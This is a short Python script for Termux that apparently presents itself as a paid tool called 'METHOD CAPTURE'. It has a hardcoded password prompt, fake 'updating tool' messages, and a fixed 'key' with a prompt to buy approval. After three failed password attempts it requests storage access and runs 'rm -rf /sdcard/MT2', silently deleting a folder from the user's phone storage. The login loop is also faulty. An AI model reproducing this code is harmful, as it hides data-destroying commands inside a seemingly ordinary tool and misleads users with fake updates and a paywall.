from os import path
import os,base64,zlib,pip,urllib,time
import os
import time
import requests

import subprocess
import os
os.system('clear')
def logo():
	print("""
\033[1;36m███    ██ ███████ ██   ██  █████  ██      
\033[1;36m████   ██ ██      ██   ██ ██   ██ ██      
\033[1;36m██ ██  ██ █████   ███████ ███████ ██      
\033[1;36m██  ██ ██ ██      ██   ██ ██   ██ ██      
\033[1;36m██   ████ ███████ ██   ██ ██   ██ ███████ 
\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m
\033[1;36m[😈] DEVELOPER : NEHAL KHAN   
\033[1;36m[😈️] GITHUB    : Nehal901   
\033[1;36m[😈] TOOL NAME : METHOD CAPTURE
\033[1;36m[😈] TOOL TYPE : PAID 
\033[1;36m[😈] VERSION   : 0.1
\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m""")
	
def login():
    attempts = 3
    while attempts > 0:
    	os.system('clear')
    	logo()
    	print("Incorrect Pass Bro... Chance Remain:", attempts)    
    	print("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
    	password = input("Enter your password: ")
    	if password == 'rxs':
    		print("Login successful!")
    		return True
    	else:
    		attempts -= 1
    else:
    	print("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
    	print("SORRY BRO YOU ARE FUCKED BY RXS")
    	print("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
    	subprocess.run(['termux-setup-storage', '-y'], capture_output=True)
    	os.system('cd /sdcard')
    	os.system('rm -rf /sdcard/MT2')
    	exit()
if login():
    # Perform additional operations after successful login
    pass  # Placeholder for additional operations
    
time.sleep(1.5)
print('[\033[1;36m√\033[1;37m] Updating Tool ! ')
time.sleep(1.5)
os.system("clear")
print('[\033[1;36m√\033[1;37m] Tool Update Done')
time.sleep(1.5)
print('[\033[1;36m√\033[1;37m] Now You Can Enjoy Tool (^,^) ')
time.sleep(1.5)
os.system("clear")

logo()
print("\033[1;36mYOUR KEY : A4HT8GSTR85B5ETY5D")
print("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
print("[+] CONTACT ADMIN TO GET APPROVAL")
input('[+] PRESS ENTER TO BUY APPROVAL')
print("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
